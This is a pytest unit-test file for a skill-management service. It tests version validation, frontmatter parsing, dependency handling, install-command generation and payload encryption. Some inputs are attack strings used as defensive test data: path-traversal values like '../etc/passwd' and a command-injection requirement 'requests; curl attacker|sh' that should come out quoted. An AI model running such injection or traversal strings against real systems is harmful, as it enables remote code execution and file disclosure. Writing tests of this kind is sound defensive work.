"""
SkillService core unit tests.
Focused on static helpers and validation logic without database dependencies.
"""

import pytest

from backend.services.skill import SkillService
from backend.services.skill_errors import SkillError, SkillErrorCode


def _assert_invalid_version(version: str) -> None:
    with pytest.raises(SkillError) as exc_info:
        SkillService._validate_version(version)
    assert exc_info.value.code == SkillErrorCode.INVALID_VERSION


class TestSkillServiceStaticMethods:
    def test_validate_version_valid_versions(self):
        assert SkillService._validate_version("1.0.0") == "1.0.0"
        assert SkillService._validate_version("v1.0.0") == "v1.0.0"
        assert SkillService._validate_version("2.3.4") == "2.3.4"
        assert SkillService._validate_version("10.20.30") == "10.20.30"
        assert SkillService._validate_version("1.0.0-alpha") == "1.0.0-alpha"
        assert SkillService._validate_version("1.0.0-beta.1") == "1.0.0-beta.1"
        assert SkillService._validate_version("1.0.0-rc.1") == "1.0.0-rc.1"

    def test_validate_version_invalid_empty(self):
        _assert_invalid_version("")

    def test_validate_version_invalid_dots(self):
        _assert_invalid_version("")
        _assert_invalid_version(".")
        _assert_invalid_version("..")
        _assert_invalid_version("1.0.0/../etc")

    def test_validate_version_invalid_path_traversal(self):
        _assert_invalid_version("../etc/passwd")
        _assert_invalid_version("1.0.0/../etc")
        _assert_invalid_version("v1/../../../etc")

    def test_validate_version_invalid_slashes(self):
        _assert_invalid_version("1.0.0/test")
        _assert_invalid_version("1.0.0\\test")

    def test_validate_version_invalid_chars(self):
        _assert_invalid_version("1.0.0!")
        _assert_invalid_version("1.0.0@")
        _assert_invalid_version("1.0.0#")

    def test_validate_version_too_long(self):
        _assert_invalid_version("a" * 101)

    def test_parse_frontmatter_complete(self):
        content = """---
name: my-skill
version: 1.0.0
description: A test skill
dependencies:
  - requests>=2.0.0
  - numpy
---
# My Skill

This is my skill content.
"""
        result = SkillService._parse_frontmatter(content)
        assert result["name"] == "my-skill"
        assert result["version"] == "1.0.0"
        assert result["description"] == "A test skill"
        assert result["dependencies"] == ["requests>=2.0.0", "numpy"]

    def test_parse_frontmatter_minimal(self):
        content = """---
name: minimal
---
Content"""
        result = SkillService._parse_frontmatter(content)
        assert result["name"] == "minimal"

    def test_parse_frontmatter_no_markers(self):
        content = "# Just content\nNo frontmatter here"
        result = SkillService._parse_frontmatter(content)
        assert result == {}

    def test_parse_frontmatter_empty_content(self):
        assert SkillService._parse_frontmatter("") == {}
        assert SkillService._parse_frontmatter("   ") == {}

    def test_parse_frontmatter_unclosed(self):
        content = """---
name: unclosed
# Missing closing"""
        result = SkillService._parse_frontmatter(content)
        assert result == {}

    def test_parse_frontmatter_invalid_yaml(self):
        content = """---
invalid: [yaml
---
# Content"""
        result = SkillService._parse_frontmatter(content)
        assert result == {}

    def test_parse_frontmatter_list_instead_of_dict(self):
        content = """---
- item1
- item2
---
# Content"""
        result = SkillService._parse_frontmatter(content)
        assert result == {}

    def test_parse_frontmatter_with_leading_whitespace(self):
        content = """
  ---
name: whitespace
---
Content"""
        result = SkillService._parse_frontmatter(content)
        assert result["name"] == "whitespace"

    def test_normalize_dependencies_list(self):
        result = SkillService._normalize_dependencies(["requests", "numpy>=1.0"])
        assert result == ["requests", "numpy>=1.0"]

    def test_normalize_dependencies_string(self):
        result = SkillService._normalize_dependencies("requests, numpy>=1.0, pandas")
        assert result == ["requests", "numpy>=1.0", "pandas"]

    def test_normalize_dependencies_empty_string(self):
        result = SkillService._normalize_dependencies("")
        assert result == []

    def test_normalize_dependencies_none(self):
        result = SkillService._normalize_dependencies(None)
        assert result == []

    def test_normalize_dependencies_number(self):
        result = SkillService._normalize_dependencies(123)
        assert result == []

    def test_parse_requirements_text_standard(self):
        text = """requests>=2.0.0
numpy>=1.20.0
pandas>=1.3.0"""
        result = SkillService._parse_requirements_text(text)
        assert "requests>=2.0.0" in result
        assert "numpy>=1.20.0" in result
        assert "pandas>=1.3.0" in result

    def test_parse_requirements_text_with_comments(self):
        text = """# Core dependencies
requests>=2.0.0
# Data processing
numpy>=1.20.0"""
        result = SkillService._parse_requirements_text(text)
        assert len(result) == 2
        assert "# Core dependencies" not in result
        assert "# Data processing" not in result

    def test_parse_requirements_text_with_blank_lines(self):
        text = """requests>=2.0.0

numpy>=1.20.0

pandas>=1.3.0"""
        result = SkillService._parse_requirements_text(text)
        assert len(result) == 3

    def test_parse_semver_standard(self):
        assert SkillService._parse_semver("1.2.3") == ("", 1, 2, 3)
        assert SkillService._parse_semver("10.20.30") == ("", 10, 20, 30)
        assert SkillService._parse_semver("0.0.1") == ("", 0, 0, 1)

    def test_parse_semver_with_v_prefix(self):
        assert SkillService._parse_semver("v1.2.3") == ("v", 1, 2, 3)
        assert SkillService._parse_semver("v10.20.30") == ("v", 10, 20, 30)

    def test_parse_semver_invalid(self):
        assert SkillService._parse_semver("1.2") is None
        assert SkillService._parse_semver("1.2.3.4") is None
        assert SkillService._parse_semver("v1.2") is None
        assert SkillService._parse_semver("invalid") is None
        assert SkillService._parse_semver("") is None

    def test_build_encryption_key_deterministic(self):
        key1 = SkillService._build_encryption_key("test-key")
        key2 = SkillService._build_encryption_key("test-key")
        assert key1 == key2

    def test_build_encryption_key_different_keys(self):
        key1 = SkillService._build_encryption_key("key1")
        key2 = SkillService._build_encryption_key("key2")
        assert key1 != key2

    def test_build_encryption_key_length(self):
        key = SkillService._build_encryption_key("any-key")
        assert len(key) == 32

    def test_build_encryption_key_purpose_isolated(self):
        key1 = SkillService._build_encryption_key("test-key", "skill-download-encryption")
        key2 = SkillService._build_encryption_key("test-key", "skill-local-cache-encryption")
        assert key1 != key2

    def test_checksum_payload_consistent(self):
        payload = b"test data"
        checksum1 = SkillService._checksum_payload(payload)
        checksum2 = SkillService._checksum_payload(payload)
        assert checksum1 == checksum2

    def test_checksum_payload_format(self):
        payload = b"test"
        checksum = SkillService._checksum_payload(payload)
        assert checksum.startswith("sha256:")
        assert len(checksum) == 71

    def test_checksum_payload_different_data(self):
        checksum1 = SkillService._checksum_payload(b"data1")
        checksum2 = SkillService._checksum_payload(b"data2")
        assert checksum1 != checksum2

    def test_normalize_dependency_spec_dict(self):
        spec = {"python": {"manager": "pip", "requirements": ["requests"]}}
        result = SkillService._normalize_dependency_spec(spec)
        assert result == spec

    def test_normalize_dependency_spec_json_string(self):
        json_str = '{"python": {"manager": "pip"}}'
        result = SkillService._normalize_dependency_spec(json_str)
        assert result == {"python": {"manager": "pip"}}

    def test_normalize_dependency_spec_invalid_json(self):
        result = SkillService._normalize_dependency_spec("not json")
        assert result is None

    def test_normalize_dependency_spec_none(self):
        result = SkillService._normalize_dependency_spec(None)
        assert result is None

    def test_normalize_dependency_spec_number(self):
        result = SkillService._normalize_dependency_spec(123)
        assert result is None

    def test_build_python_commands_pip_with_requirements(self):
        cmds = SkillService._build_python_commands(
            "pip", ["requests>=2.0.0"], ["requirements.txt", "setup.py"]
        )
        assert "pip install -r requirements.txt" in cmds
        assert "pip install 'requests>=2.0.0'" in cmds

    def test_build_python_commands_pip_no_requirements_file(self):
        cmds = SkillService._build_python_commands("pip", ["requests"], [])
        assert "pip install requests" in cmds
        assert "pip install -r requirements.txt" not in cmds

    def test_build_python_commands_quotes_untrusted_requirements(self):
        cmds = SkillService._build_python_commands("pip", ["requests; curl attacker|sh"], [])
        assert "pip install 'requests; curl attacker|sh'" in cmds

    def test_build_python_commands_poetry(self):
        cmds = SkillService._build_python_commands("poetry", [], [])
        assert cmds == ["poetry install"]

    def test_build_python_commands_uv_with_requirements(self):
        cmds = SkillService._build_python_commands("uv", [], ["requirements.txt"])
        assert "uv pip install -r requirements.txt" in cmds
        assert "uv sync" not in cmds

    def test_build_python_commands_uv_with_pyproject(self):
        cmds = SkillService._build_python_commands("uv", [], ["pyproject.toml"])
        assert "uv sync" in cmds
        assert "uv pip install" not in cmds

    def test_build_python_commands_uv_with_pyproject_and_requirements(self):
        cmds = SkillService._build_python_commands("uv", ["requests"], ["pyproject.toml", "requirements.txt"])
        assert "uv sync" in cmds
        assert "uv pip install requests" in cmds

    def test_build_python_commands_uv_without_requirements(self):
        cmds = SkillService._build_python_commands("uv", [], [])
        assert cmds == []

    def test_build_python_commands_conda_with_environment_yml(self):
        cmds = SkillService._build_python_commands("conda", [], ["environment.yml"])
        assert "conda env create -f environment.yml" in cmds

    def test_build_python_commands_empty(self):
        cmds = SkillService._build_python_commands("pip", [], [])
        assert cmds == []

    def test_build_node_commands_npm_with_lockfile(self):
        cmds = SkillService._build_node_commands("npm", True)
        assert cmds == ["npm ci"]

    def test_build_node_commands_npm_without_lockfile(self):
        cmds = SkillService._build_node_commands("npm", False)
        assert cmds == ["npm install"]

    def test_build_node_commands_pnpm(self):
        cmds = SkillService._build_node_commands("pnpm", True)
        assert cmds == ["pnpm install"]

    def test_build_node_commands_yarn(self):
        cmds = SkillService._build_node_commands("yarn", False)
        assert cmds == ["yarn install"]

    def test_encrypt_payload(self):
        payload = b"test payload content"
        encrypted, checksum = SkillService._encrypt_payload(payload)
        assert encrypted is not None
        assert isinstance(encrypted, str)
        assert checksum.startswith("sha256:")

        import base64

        encrypted_bytes = base64.b64decode(encrypted)
        assert len(encrypted_bytes) > len(payload)

    def test_encrypt_payload_different_inputs(self):
        encrypted1, _ = SkillService._encrypt_payload(b"data1")
        encrypted2, _ = SkillService._encrypt_payload(b"data2")
        assert encrypted1 != encrypted2

    def test_encrypt_payload_same_input_different_output(self):
        encrypted1, _ = SkillService._encrypt_payload(b"same data")
        encrypted2, _ = SkillService._encrypt_payload(b"same data")
        assert encrypted1 != encrypted2
